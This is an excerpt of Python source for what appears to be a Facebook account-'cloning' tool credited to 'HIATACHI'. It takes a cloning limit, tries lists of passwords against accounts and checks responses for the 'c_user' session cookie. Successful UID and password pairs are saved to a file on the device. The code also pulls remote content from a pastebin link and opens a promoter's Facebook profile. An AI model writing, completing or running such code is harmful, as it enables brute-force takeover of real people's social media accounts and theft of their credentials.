...
os.system('am start https://www.facebook.com/profile.php?id=100000999431011')
...
try:
    ...
    os.system("xdg-open https://www.facebook.com/profile.php?id=100000999431011")
...
def subc():
   ...
   ses=requests.get("https://pastebin.com/zwpV791g").text
...
oks = []
twf = []
os.system('xdg-open https://www.facebook.com/profile.php?id=100000999431011/?ref=share')
os.system('xdg-open https://www.facebook.com/profile.php?id=100000999431011/?ref=share')
...
يوتس هروبلا تادالا ممصم‫

  AUTHOR   :   HIATACHI
  FACEBOOK :   HIATACHI
  GITHUB    :   /////////
  LIFE STATUS  :  HIATACHI
  phone number    : 0915430176
  TOOL STATUS :  No Free بوبح تاكارتشا تادا                        
\033[1;91m=========================================================="""
...
def xyz():
    ...
    if LUQMAN in ["1","01"]:
       ...
       exit()
        ...
        print('\033[1;31mHIATACHI!\033[1;31m')
        xyz()
...
def Tabii():
    ...
    print(f"")
    clear()
    print(f"          \x1b[97m[\033[37;41m  H I A T A C H I    \033[0;m]")
    print(f"")
    linex()
    print(f"        \x1b[97m[\033[95;42mEXAMPLE :👇HIATACHI\033[0;m]")
    print(f"")
    ...
    print(f"          \x1b[97m[\033[37;41m  H I A T A C H I   \033[0;m]")
    print(f"")
    limit = int(input(' EXAMPLE: 1000, 3000, 2000, 5000, 10000\n\n PUT CLONING LIMIT: '))
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid=coki[24:39]
                Red = '\033[1;31m'
                print(f'\r{Red}[×]--------------------[A B D O-CP😥]---------------------[×]\nNUMBER : '+uid+'\nUID   : '+cid+' √ '+ps+ '\n[×]---------------------------------------------------[×]\033[1;97m')
                open('/sdcard/A B D O-CP.txt', 'a').write(cid+' | '+ps+'\n')
                cps.append(cid)
                break
